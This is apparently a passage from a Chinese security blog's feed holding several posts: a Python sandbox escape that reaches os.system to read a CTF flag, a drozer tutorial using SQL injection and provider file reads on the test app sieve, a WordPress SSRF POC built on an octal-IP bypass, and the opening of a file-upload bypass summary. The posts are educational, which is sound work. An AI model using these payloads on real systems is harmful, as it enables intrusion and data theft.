[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()</span><br><span class="line">[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]</span><br></pre></td></tr></table></figure></p><p>可以看到这里可以调用os模块，接下来就调用system函数了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p><p>整理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">144</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys()[144]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&apos;system&apos;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.values()[144]</span><br><span class="line">&gt;&gt;&gt; s(&apos;pwd&apos;)</span><br><span class="line">/home/xxxx/Desktop/code/python-code/test</span><br></pre></td></tr></table></figure></p><p>好了现在可以执行系统命令了，cat一下flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过上面的python沙盒逃逸，发现读python官网手册还是很有必要的，找个时间一点一点看：）共勉</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【MOBILE】how to install drozer on mac</title>
      <link href="/2016/08/20/old-how-to-install-drozer-on-mac/"/>
      <url>/2016/08/20/old-how-to-install-drozer-on-mac/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>drozer是一款针对Android系统的安全测试框架。drozer可以帮助Android app和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。</p><ol><li>更快的Android安全评估<br>drozer可以大大缩减Android安全评估的耗时，通过攻击测试暴露Android APP的漏洞。</li><li>基于真机的测试<br>drozer运行在Android模拟器和真实设备上，它只需要USB调试即可使用。</li><li>自动化和扩展<br>drozer有很多扩展模块，你可以找到他们进行测试以发现Android安全问题。</li></ol><a id="more"></a><h1 id="二：安装"><a href="#二：安装" class="headerlink" title="二：安装"></a>二：安装</h1><p>drozer下载链接：<a href="https://github.com/mwrlabs/drozer" target="_blank" rel="noopener">https://github.com/mwrlabs/drozer</a></p><blockquote><p>window和Linux下的安装要简单的多，但是在mac上安装时遇到了一些错误，因此将自己的安装步骤记录下来。</p></blockquote><p>因为是用python写的，所以Mac可以下载python.egg文件进行安装。但是想通过<code>easy_install</code>安装，必须拥有以下这些模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cffi==1.1.2</span><br><span class="line">cryptography==0.9.3</span><br><span class="line">drozer==2.3.4</span><br><span class="line">enum34==1.0.4</span><br><span class="line">idna==2.0</span><br><span class="line">ipaddress==1.0.14</span><br><span class="line">protobuf==2.4.1</span><br><span class="line">pyasn1==0.1.8</span><br><span class="line">pycparser==2.14</span><br><span class="line">pyOpenSSL==0.13</span><br><span class="line">six==1.9.0</span><br><span class="line">Twisted==10.2.0</span><br></pre></td></tr></table></figure><p>而安装过程中主要的错误是由pyOpenSSL造成的。</p><h3 id="1-1-安装openssl"><a href="#1-1-安装openssl" class="headerlink" title="1.1 安装openssl"></a>1.1 安装openssl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall openssl #if installed already</span><br><span class="line">$ brew install openssl</span><br></pre></td></tr></table></figure><h3 id="1-2-编译pyOpenSSL"><a href="#1-2-编译pyOpenSSL" class="headerlink" title="1.2 编译pyOpenSSL"></a>1.2 编译pyOpenSSL</h3><p>不幸的是在后面安装Python.egg还是会报错,原因是Drozer需要特殊版本的openssl，我们需要下载 pyOpenSSL v0.13，然后用<code>sed</code>指令修复typo，具体指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ tar xzvf pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ cd pyOpenSSL-0.13</span><br><span class="line">$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c</span><br></pre></td></tr></table></figure></p><p>接下来我们build OpenSSL，这里需要指明本机中OpenSSL headers文件的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure></p><h3 id="1-3-安装其他支撑文件"><a href="#1-3-安装其他支撑文件" class="headerlink" title="1.3 安装其他支撑文件"></a>1.3 安装其他支撑文件</h3><p>终于进入安装说明文档中的步骤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1</span><br><span class="line">$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works</span><br></pre></td></tr></table></figure></p><h3 id="1-4-安装drozer"><a href="#1-4-安装drozer" class="headerlink" title="1.4 安装drozer"></a>1.4 安装drozer</h3><p>最后一步，install drozer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install ./drozer-2.3.4-py2.7.egg</span><br></pre></td></tr></table></figure></p><h3 id="1-5-runnning"><a href="#1-5-runnning" class="headerlink" title="1.5 runnning"></a>1.5 runnning</h3><p>此时可以在任何目录下使用drozer 命令啦！</p><h1 id="三：Drozer入门—-获取App-Package信息"><a href="#三：Drozer入门—-获取App-Package信息" class="headerlink" title="三：Drozer入门— 获取App Package信息"></a>三：Drozer入门— 获取App Package信息</h1><p><strong><em>此处以<a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk" target="_blank" rel="noopener">sieve.apk</a>为例</em></strong></p><p>drozer每个模块的作用：</p><p><img src="http://blog.0kami.cn/img/drozer/imag1.png" alt=""></p><p>获取App包信息的模块是 <em>**</em> app.package.* :</p><h3 id="2-1-获取获取Android设备上的所有的安装的App的包名"><a href="#2-1-获取获取Android设备上的所有的安装的App的包名" class="headerlink" title="2.1 获取获取Android设备上的所有的安装的App的包名"></a>2.1 获取获取Android设备上的所有的安装的App的包名</h3><p>命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve run app.package.list</span><br></pre></td></tr></table></figure></p><p>这条命令会把所有的App都列出来，如果想具体查找某个App可加上-f [App关键字]的参数，如查找sieve在Android设备中的包名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure></p><h3 id="2-2-获取Sieve的一些基本信息"><a href="#2-2-获取Sieve的一些基本信息" class="headerlink" title="2.2 获取Sieve的一些基本信息"></a>2.2 获取Sieve的一些基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="http://blog.0kami.cn/img/drozer/imag2.png" alt=""></p><h3 id="2-3-Itentify-The-Attack-Surface-确定攻击面"><a href="#2-3-Itentify-The-Attack-Surface-确定攻击面" class="headerlink" title="2.3 Itentify The Attack Surface(确定攻击面)"></a>2.3 Itentify The Attack Surface(确定攻击面)</h3><p>这个测试教程主要关注的是Android 固有的IPC通信机制的脆弱性，这些特点导致了App泄漏敏感信息给同一台设备上的其它App。 查找可以进行Attack Surface的组件的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag3.png" alt=""><br>结果显示了潜在可以利用的组件个数： “exported”表示组件可以被其他App使用。 services is debuggable表示我们可以用adb绑定一个调试器到进程。</p><h3 id="2-4-进一步获取Attack-Surface的信息"><a href="#2-4-进一步获取Attack-Surface的信息" class="headerlink" title="2.4 进一步获取Attack Surface的信息"></a>2.4 进一步获取Attack Surface的信息</h3><p>如进一步获取ativity组建的attack surface信息的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag4.png" alt=""></p><h3 id="2-5-启动Activities"><a href="#2-5-启动Activities" class="headerlink" title="2.5 启动Activities"></a>2.5 启动Activities</h3><p>上图的PWList和FileSelectActivity是exported并且不需要任何权限，我们可以用drozer启动他们，比如感觉PWList这个含金量应该大一点，所以就启动它了，命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start –component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></p><h3 id="2-6-从Content-Provider中获取信息"><a href="#2-6-从Content-Provider中获取信息" class="headerlink" title="2.6 从Content Provider中获取信息"></a>2.6 从Content Provider中获取信息</h3><p>接上2.3节，进一步获取<code>content provider</code>的<code>attact surface</code>的信息的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag5.png" alt=""><br>从上图可以看到2.3节中两个exported的<code>content provider</code>的具体信息，包括名字，权限，访问路径等。</p><h5 id="2-6-1-查找可以访问Content-Provider的URI（数据泄漏）"><a href="#2-6-1-查找可以访问Content-Provider的URI（数据泄漏）" class="headerlink" title="2.6.1 查找可以访问Content Provider的URI（数据泄漏）"></a>2.6.1 查找可以访问Content Provider的URI（数据泄漏）</h5><p>从上节图中我们猜测DBContentProvider会有某种格式的数据库，但是我们不知道其中的数据是如何组织的。Content URI必须是 “content:///” 的形式,因此我们可以构造部分的content URIs来访问DBcontent Provider。 上图存在一个需要READ_KEYS和WRITE_KEYS权限才能读和写的“/Keys”的路径。<br>drozer的scanner模块提供了一些方法去猜测可能存在的content URIs：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag6.png" alt=""><br>上图中检测出了可以访问content的URI，接下来我们可以用drozer的其他模块和URI从content中获取，甚至更改信息。 如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag7.png" alt=""><br>如上图我们获取了用户名，邮箱帐号，和Base64编码的密码字符串。</p><h5 id="2-6-2-进行SQL注入"><a href="#2-6-2-进行SQL注入" class="headerlink" title="2.6.2 进行SQL注入"></a>2.6.2 进行SQL注入</h5><p>Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用<code>projection</code>参数和<code>seleciton</code>参数可以传递一些简单的SQL注入语句到Content provider。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘”</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘”</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag8.png" alt=""><br>上面两条命令执行后Android设备返回了非常详细的错误信息。<br>使用Sql注入列出数据库中的所有数据表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–“</span><br></pre></td></tr></table></figure></p><p>使用SQL注入列出数据表的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“</span><br></pre></td></tr></table></figure></p><p>使用SQL注入列出数据表的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“</span><br></pre></td></tr></table></figure></p><h5 id="2-6-3-从File-System-Backed-Content-Providers获取信息"><a href="#2-6-3-从File-System-Backed-Content-Providers获取信息" class="headerlink" title="2.6.3 从File System-Backed Content Providers获取信息"></a>2.6.3 从File System-Backed Content Providers获取信息</h5><p><code>File System-backed Content Provider</code>提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 对于sieve来说，我们可以推测出的<code>FileBackupProvider</code>就是一个file system-backed content provider。 我们可以使用drozer的app.provider.read模块查看某个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></p><p>可以使用<code>app.provider.download</code>下载文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure></p><h5 id="2-6-4-检查Content-Provider的脆弱性"><a href="#2-6-4-检查Content-Provider的脆弱性" class="headerlink" title="2.6.4 检查Content Provider的脆弱性"></a>2.6.4 检查Content Provider的脆弱性</h5><p>检查是否有SQL注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>检查是否存在遍历文件的漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><strong><em>总结体会：我觉得在刚开始获取了软件包的基本信息后，就先用模块scanner里面的工具扫一扫，找到一些漏洞或者利用点后再进行下一步。</em></strong></p><h3 id="2-7-和Services交互"><a href="#2-7-和Services交互" class="headerlink" title="2.7 和Services交互"></a>2.7 和Services交互</h3><p>获取是exported状态的services的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>关于Services的模块：<br>如向某个服务发送信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3</span><br></pre></td></tr></table></figure></p><h3 id="2-8-其他常用模块"><a href="#2-8-其他常用模块" class="headerlink" title="2.8 其他常用模块"></a>2.8 其他常用模块</h3><ul><li>shell.start 在Android设备上开启一个交互式Linux Shell</li><li>tools.file.upload / tools.file.downloa</li><li>tools.setup.busybox / tools.setup.minimalsu 安 装busybox或者minimalsu到Android设备上</li></ul><p>参考链接：<a href="https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/" target="_blank" rel="noopener">https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/</a><br><a href="http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" target="_blank" rel="noopener">http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Analysis】wordpress SSRF &lt;4.5</title>
      <link href="/2016/08/19/old-wordpress-ssrf-4-4-2/"/>
      <url>/2016/08/19/old-wordpress-ssrf-4-4-2/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。<br><a id="more"></a></p><h3 id="ip地址的几种表示方式"><a href="#ip地址的几种表示方式" class="headerlink" title="ip地址的几种表示方式"></a>ip地址的几种表示方式</h3><p>ip地址域名有多种表示方式，浏览器都能识别出来。</p><h6 id="常见的ip地址域名表示方法"><a href="#常见的ip地址域名表示方法" class="headerlink" title="常见的ip地址域名表示方法"></a>常见的ip地址域名表示方法</h6><ul><li>点分十进制表示法，例如192.168.1.2</li><li>二进制表示法例如11000000101010000000000100000010，表示192.168.1.2</li></ul><h6 id="非常见ip地址域名表示方法"><a href="#非常见ip地址域名表示方法" class="headerlink" title="非常见ip地址域名表示方法"></a>非常见ip地址域名表示方法</h6><ul><li>整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问<a href="http://3232235778" target="_blank" rel="noopener">http://3232235778</a> 解析为192.168.1.2，除此之外还可以通过公式<code>192*256^3+168*256^2+1*256+2=3232235778</code>换算</li><li>八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制</li><li>十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制</li><li>混合型：即以上的几种方式的结合，0300.0xA8.1.0x02</li></ul><p>下面就是通过八进制绕过检测。</p><h3 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h3><p>漏洞成因处508 <code>wp_http_validate_url</code> 函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line"><span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">$ip = $host;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ip = gethostbyname( $host );</span><br><span class="line"><span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">$ip = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p><p>这里的代码通过正则表达式<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>判断ip是否合法，如果不合法则通过网络获取ip的值。<br>下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p><p>再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。<br>综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080<br>找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p><p>这里设置10.10.10.111为受害者<br><img src="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png" alt="image"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）<br>还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="noopener">https://virusdefender.net/index.php/archives/733/</a></p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】文件上传学习总结</title>
      <link href="/2016/07/04/old-file-upload/"/>
      <url>/2016/07/04/old-file-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这几天空下来根据<a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="noopener">上传攻击框架</a>学习总结一下上传攻击。<br><a id="more"></a></p><h3 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h3><ol><li>客户端javascript检测（检测文件扩展名为主）</li><li>服务端MIME类型检测（检测Content-type内容）</li><li>服务端目录路劲检测（检测跟path相关的内容）</li><li>服务端文件扩展名检测（检测跟文件后缀相关的内容）</li><li>服务端文件内容检测（检测内容是否合法或含有恶意代码）</li></ol><h3 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h3><p>通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测，例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。<br>这类检测也是最容易绕过的检测，可以使用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交。<br>使用burp，上传时提供一个白名单内的后缀，通过burp拦包，并修改后缀后提交</p><h3 id="服务端检测绕过（MIME类型检测）"><a href="#服务端检测绕过（MIME类型检测）" class="headerlink" title="服务端检测绕过（MIME类型检测）"></a>服务端检测绕过（MIME类型检测）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span 